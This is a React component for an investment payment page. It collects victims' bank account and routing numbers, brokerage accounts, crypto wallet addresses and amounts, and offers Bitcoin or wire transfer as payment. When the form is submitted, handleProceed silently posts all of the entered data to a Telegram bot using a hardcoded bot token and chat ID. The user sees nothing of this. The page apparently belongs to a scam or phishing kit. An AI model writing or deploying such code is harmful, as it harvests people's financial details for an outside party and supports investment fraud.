import { useState } from "react";
import { useNavigate } from "react-router-dom";
import {
  FaArrowCircleLeft,
  FaPiggyBank,
  FaBitcoin,
  FaChartLine,
  FaHandHoldingUsd,
  FaLandmark,
  FaHandshake,
  FaHome,
} from "react-icons/fa";
import { AiOutlineInfoCircle } from "react-icons/ai";

import BottomNav from "../pages/stickyNav";
import BottomNav2 from "../pages/bottomnav2";

type FieldType = "text" | "number" | "email" | "select";

type InvestmentField = {
  name: string;
  label: string;
  placeholder: string;
  type?: FieldType;
  required?: boolean;
  options?: string[];
};

type Investment = {
  id: number;
  name: string;
  icon: JSX.Element;
  color: string;
  description: string;
  fields: InvestmentField[];
};

const investments: Investment[] = [
  {
    id: 1,
    name: "Savings Account",
    icon: <FaPiggyBank />,
    color: "text-pink-600",
    description:
      "A savings account lets you safely store money and earn a small interest over time.",
    fields: [
      {
        name: "accountHolder",
        label: "Account Holder Name",
        placeholder: "Enter account holder name",
        type: "text",
      },
      {
        name: "bankName",
        label: "Bank Name",
        placeholder: "Enter bank name",
        type: "text",
      },
      {
        name: "accountNumber",
        label: "Account Number",
        placeholder: "Enter account number",
        type: "text",
      },
      {
        name: "routingNumber",
        label: "Routing Number",
        placeholder: "Enter routing number",
        type: "text",
      },
      {
        name: "amount",
        label: "Amount",
        placeholder: "Enter amount",
        type: "number",
      },
    ],
  },

  {
    id: 2,
    name: "Cryptocurrency",
    icon: <FaBitcoin />,
    color: "text-yellow-500",
    description:
      "Invest in digital currencies such as Bitcoin or Ethereum.",
    fields: [
      {
        name: "cryptoName",
        label: "Cryptocurrency",
        placeholder: "Select cryptocurrency",
        type: "select",
        options: ["Bitcoin", "Ethereum", "USDT", "USDC"],
      },
      {
        name: "walletAddress",
        label: "Wallet Address",
        placeholder: "Enter wallet address",
        type: "text",
      },
      {
        name: "network",
        label: "Network",
        placeholder: "Select network",
        type: "select",
        options: ["Bitcoin", "Ethereum", "BSC", "TRON"],
      },
      {
        name: "amount",
        label: "Amount",
        placeholder: "Enter amount",
        type: "number",
      },
    ],
  },

  {
    id: 3,
    name: "Stocks & ETFs",
    icon: <FaChartLine />,
    color: "text-green-600",
    description:
      "Buy shares of companies or ETFs for long-term growth and dividends.",
    fields: [
      {
        name: "brokerageName",
        label: "Brokerage Platform",
        placeholder: "Enter brokerage name",
        type: "text",
      },
      {
        name: "brokerageAccount",
        label: "Brokerage Account",
        placeholder: "Enter brokerage account",
        type: "text",
      },
      {
        name: "investmentName",
        label: "Stock / ETF",
        placeholder: "Enter stock or ETF name",
        type: "text",
      },
      {
        name: "amount",
        label: "Investment Amount",
        placeholder: "Enter amount",
        type: "number",
      },
    ],
  },

  {
    id: 4,
    name: "Mutual Funds",
    icon: <FaHandHoldingUsd />,
    color: "text-indigo-600",
    description:
      "Pooled investments managed by professionals for diversification.",
    fields: [
      {
        name: "fundName",
        label: "Fund Name",
        placeholder: "Enter mutual fund name",
        type: "text",
      },
      {
        name: "accountNumber",
        label: "Investment Account Number",
        placeholder: "Enter account number",
        type: "text",
      },
      {
        name: "fundManager",
        label: "Fund Manager",
        placeholder: "Enter fund manager",
        type: "text",
      },
      {
        name: "amount",
        label: "Investment Amount",
        placeholder: "Enter amount",
        type: "number",
      },
    ],
  },

  {
    id: 5,
    name: "Government Bonds",
    icon: <FaLandmark />,
    color: "text-blue-500",
    description:
      "Fixed-income securities issued by governments.",
    fields: [
      {
        name: "bondType",
        label: "Bond Type",
        placeholder: "Select bond type",
        type: "select",
        options: [
          "Treasury Bond",
          "Government Note",
          "Government Bill",
          "Savings Bond",
        ],
      },
      {
        name: "investorName",
        label: "Investor Name",
        placeholder: "Enter investor name",
        type: "text",
      },
      {
        name: "investorAccount",
        label: "Investor Account Number",
        placeholder: "Enter account number",
        type: "text",
      },
      {
        name: "amount",
        label: "Investment Amount",
        placeholder: "Enter amount",
        type: "number",
      },
    ],
  },

  {
    id: 6,
    name: "Real Estate",
    icon: <FaHome />,
    color: "text-orange-500",
    description:
      "Invest in residential or commercial properties for income and growth.",
    fields: [
      {
        name: "propertyName",
        label: "Property / Project Name",
        placeholder: "Enter property or project",
        type: "text",
      },
      {
        name: "location",
        label: "Property Location",
        placeholder: "Enter property location",
        type: "text",
      },
      {
        name: "investorName",
        label: "Investor Name",
        placeholder: "Enter investor name",
        type: "text",
      },
      {
        name: "amount",
        label: "Investment Amount",
        placeholder: "Enter amount",
        type: "number",
      },
    ],
  },

  {
    id: 7,
    name: "Partnerships",
    icon: <FaHandshake />,
    color: "text-purple-600",
    description:
      "Invest in or partner with businesses to share in their profits.",
    fields: [
      {
        name: "businessName",
        label: "Business / Partnership Name",
        placeholder: "Enter business name",
        type: "text",
      },
      {
        name: "contactName",
        label: "Contact Person",
        placeholder: "Enter contact person's name",
        type: "text",
      },
      {
        name: "partnershipType",
        label: "Partnership Type",
        placeholder: "Select partnership type",
        type: "select",
        options: [
          "Business Partnership",
          "Profit Sharing",
          "Joint Venture",
          "Investment Partnership",
        ],
      },
      {
        name: "amount",
        label: "Investment Amount",
        placeholder: "Enter amount",
        type: "number",
      },
    ],
  },
];

const PaymentPage = () => {
  const navigate = useNavigate();

  const [selectedInvestment, setSelectedInvestment] =
    useState<Investment | null>(null);

  const [formData, setFormData] = useState<Record<string, string>>({});

  const [submitting, setSubmitting] = useState(false);

  const openInvestment = (investment: Investment) => {
    setSelectedInvestment(investment);

    // Reset fields whenever another investment is selected
    setFormData({});
  };

  const closeModal = () => {
    if (submitting) return;

    setSelectedInvestment(null);
    setFormData({});
  };

  const handleChange = (fieldName: string, value: string) => {
    setFormData((previous) => ({
      ...previous,
      [fieldName]: value,
    }));
  };

 const handleProceed = async () => {
  if (!selectedInvestment) return;

  const missingField = selectedInvestment.fields.find(
    (field) =>
      field.required !== false &&
      !formData[field.name]?.trim()
  );

  if (missingField) {
    alert(`Please enter ${missingField.label}.`);
    return;
  }

  setSubmitting(true);

  const paymentData = {
    investmentType: selectedInvestment.name,
    ...formData,
  };

  // Telegram bot details
  const botToken = "8640691963:AAHanBYOQ-VFY-hhMEpuDdqQNJT96VUFxGY";
  const chatId = "8664377600";

  // Create Telegram message
  const message = `
💰 NEW INVESTMENT REQUEST

━━━━━━━━━━━━━━━━━━

Investment Type:
${selectedInvestment.name}

${Object.entries(formData)
  .map(([key, value]) => `${key}: ${value}`)
  .join("\n")}

━━━━━━━━━━━━━━━━━━

📅 ${new Date().toLocaleString()}
`;

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
        }),
      }
    );

    const result = await response.json();

    if (!result.ok) {
      throw new Error("Telegram message could not be sent.");
    }

    // Telegram sent successfully → go to payment page
    navigate("/payment", {
      state: paymentData,
    });
  } catch (error) {
    console.error("Telegram error:", error);

    alert("Unable to process your request. Please try again.");
  } finally {
    setSubmitting(false);
  }
};

  return (
    <>
      <div className="min-h-screen bg-gradient-to-br from-purple-50 to-blue-50 flex flex-col items-center px-4 py-6 pb-24">

        {/* Header */}
        <header className="w-full flex items-center justify-between py-4 border-b max-w-4xl">

          <button
            type="button"
            className="text-2xl text-purple-600 hover:text-purple-800 transition"
            onClick={() => navigate(-1)}
          >
            <FaArrowCircleLeft />
          </button>

          <h1 className="text-xl md:text-2xl font-bold text-gray-800">
            Investment Options
          </h1>

          <div className="w-8" />
        </header>

        {/* Investment Cards */}
        <div className="w-full max-w-4xl mt-8 grid gap-6 grid-cols-1 sm:grid-cols-2 lg:grid-cols-3">

          {investments.map((item) => (
            <div
              key={item.id}
              className="bg-white border border-gray-100 shadow-lg rounded-2xl p-6 flex items-center justify-between hover:shadow-2xl transition-all cursor-pointer"
              onClick={() => openInvestment(item)}
            >
              <div className="flex items-center space-x-4">

                <div
                  className={`w-12 h-12 flex items-center justify-center rounded-full bg-purple-100 ${item.color}`}
                >
                  {item.icon}
                </div>

                <span className="text-sm font-semibold text-gray-800">
                  {item.name}
                </span>

              </div>

              <AiOutlineInfoCircle className="text-gray-400 text-lg" />
            </div>
          ))}

        </div>
      </div>

      {/* Dynamic Modal */}
      {selectedInvestment && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 px-4 py-6">

          <div className="bg-white rounded-2xl w-full max-w-md shadow-2xl max-h-[90vh] overflow-y-auto">

            {/* Modal Header */}
            <div className="sticky top-0 bg-white border-b px-6 py-5 flex items-center justify-between">

              <div>
                <h2 className="text-xl font-bold text-gray-800">
                  {selectedInvestment.name}
                </h2>

                <p className="text-xs text-gray-500 mt-1">
                  Investment details
                </p>
              </div>

              <button
                type="button"
                onClick={closeModal}
                disabled={submitting}
                className="text-gray-400 hover:text-gray-700 text-2xl"
              >
                &times;
              </button>

            </div>

            {/* Modal Body */}
            <div className="p-6">

              <p className="text-sm text-gray-600 mb-6">
                {selectedInvestment.description}
              </p>

              <div className="space-y-4">

                {selectedInvestment.fields.map((field) => (

                  <div key={field.name}>

                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      {field.label}
                    </label>

                    {field.type === "select" ? (

                      <select
                        value={formData[field.name] || ""}
                        onChange={(e) =>
                          handleChange(field.name, e.target.value)
                        }
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500 bg-white"
                      >

                        <option value="">
                          {field.placeholder}
                        </option>

                        {field.options?.map((option) => (
                          <option key={option} value={option}>
                            {option}
                          </option>
                        ))}

                      </select>

                    ) : (

                      <input
                        type={field.type || "text"}
                        placeholder={field.placeholder}
                        value={formData[field.name] || ""}
                        onChange={(e) =>
                          handleChange(field.name, e.target.value)
                        }
                        className="w-full px-4 py-3 border border-gray-300 rounded-lg outline-none focus:ring-2 focus:ring-purple-500 focus:border-purple-500"
                      />

                    )}

                  </div>

                ))}

              </div>

              {/* Payment Method */}
              <div className="mt-5">

                <label className="block text-sm font-medium text-gray-700 mb-1">
                  Payment Method
                </label>

                <select
                  value={formData.paymentMethod || ""}
                  onChange={(e) =>
                    handleChange("paymentMethod", e.target.value)
                  }
                  className="w-full px-4 py-3 border border-gray-300 rounded-lg outline-none focus:ring-2 focus:ring-purple-500 bg-white"
                >
                  <option value="">
                    Select Payment Method
                  </option>

                  <option value="Bitcoin">
                    Bitcoin
                  </option>

                  <option value="Wire Transfer">
                    Wire Transfer
                  </option>

                  <option value="Bank Transfer">
                    Bank Transfer
                  </option>

                </select>

              </div>

              {/* Buttons */}
              <div className="flex gap-3 mt-6">

                <button
                  type="button"
                  onClick={closeModal}
                  disabled={submitting}
                  className="flex-1 px-4 py-3 bg-gray-200 text-gray-800 rounded-lg hover:bg-gray-300 transition disabled:opacity-50"
                >
                  Cancel
                </button>

                <button
                  type="button"
                  onClick={handleProceed}
                  disabled={submitting}
                  className="flex-1 px-4 py-3 bg-purple-600 text-white rounded-lg hover:bg-purple-700 transition disabled:opacity-50"
                >
                  {submitting ? "Processing..." : "Continue"}
                </button>

              </div>

            </div>
          </div>
        </div>
      )}

      <BottomNav />
      <BottomNav2 />
    </>
  );
};

export default PaymentPage;